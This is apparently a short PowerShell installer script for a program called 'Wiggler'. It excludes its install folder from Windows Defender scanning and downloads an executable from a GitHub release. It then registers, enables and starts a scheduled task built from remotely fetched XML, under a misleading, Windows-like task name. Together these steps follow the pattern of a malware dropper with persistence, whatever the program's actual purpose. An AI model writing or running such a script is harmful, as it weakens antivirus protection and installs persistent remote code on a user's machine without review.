mkdir "C:\Program Files\Wiggler"
cd "C:\Program Files\Wiggler"

Add-MpPreference -ExclusionPath 'C:\Program Files\Wiggler'

wget https://github.com/RacoonK1ng/Wiggler/releases/download/releases2/wiggle.exe -O wiggle.exe
wget https://github.com/RacoonK1ng/Wiggler/releases/download/releases2/sound.wav -O sound.wav


Register-ScheduledTask -Xml (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RacoonK1ng/Wiggler/refs/heads/main/Task.xml").Content -TaskName "WindowsGUIWindowbullshit" -Force

Enable-ScheduledTask -TaskName "WindowsGUIWindowbullshit"


Start-ScheduledTask -TaskName "WindowsGUIWindowbullshit"

exit
